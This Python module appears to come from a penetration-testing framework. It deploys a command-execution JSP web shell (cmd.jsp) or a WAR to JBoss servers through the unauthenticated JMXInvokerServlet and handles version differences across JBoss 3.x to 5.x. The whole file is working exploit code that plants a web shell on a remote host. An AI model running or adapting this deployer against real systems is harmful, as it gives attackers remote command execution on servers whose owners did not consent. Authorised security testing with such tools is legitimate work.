from src.platform.jboss.interfaces import JINTERFACES
from src.module.deploy_utils import invkdeploy, parse_war_path
from os.path import abspath
from random import randint
from log import LOG
import utility

versions = ["Any", "3.2", "4.0", "4.2", "5.0", "5.1"]
title = JINTERFACES.JIN
def deploy(fingerengine, fingerprint):
    """ This deployer attempts to deploy to the JMXInvokerServlet, often
    left unprotected.  For versions 3.x and 4.x we can deploy WARs, but for 5.x
    the HttpAdaptor invoker is broken (in JBoss), so instead we invoke 
    the DeploymentFileRepository method.  This requires a JSP instead of a WAR.
    """

    war_file = fingerengine.options.deploy
    war_name = parse_war_path(war_file)

    utility.Msg("Preparing to deploy {0}...".format(war_file))

    url = "http://{0}:{1}/invoker/JMXInvokerServlet".format(
                   fingerengine.options.ip, fingerprint.port)
    fingerengine.random_int = str(randint(50,300))


    # the attached fingerprint doesnt have a version; lets pull one of the others
    # to fetch it.  dirty hack.
    fp = [f for f in fingerengine.fingerprints if f.version != 'Any']
    if len(fp) > 0:
        fp = fp[0]
    else:
        ver = utility.capture_input("Could not reliably determine version, "
                                    "please enter the remote JBoss instance"
                                    " version")
        if len(ver) > 0:
            if '.' not in ver:
                ver += '.0'

            if ver not in versions:
                utility.Msg("Failed to find a valid fingerprint for deployment.", LOG.ERROR)
                return
            else:
                fp = fingerprint
                fp.version = ver
        else:
            return

    if '.war' in war_file:
        tmp = utility.capture_input("This deployer requires a JSP, default to cmd.jsp? [Y/n]")
        if 'n' in tmp.lower():
                    return

        war_file = abspath("./src/lib/resources/cmd.jsp")
        war_name = "cmd"

    response = invkdeploy(fp.version, url, abspath(war_file),
                          fingerengine.random_int)
        
    if len(response) > 1:
        if('org.jboss.web.tomcat.security.SecurityAssociationValve' in response and 'org.apache.catalina.authenticator.AuthenticatorBase.invoke' in response):
            utility.Msg('Deployment failed due to insufficient or invalid credentials.', LOG.ERROR)
        else:
            utility.Msg(response, LOG.DEBUG)
    else:
        utility.Msg("{0} deployed to {1} (/{2})".format(war_name,
                                fingerengine.options.ip,
                                war_name + fingerengine.random_int), 
                                LOG.SUCCESS)
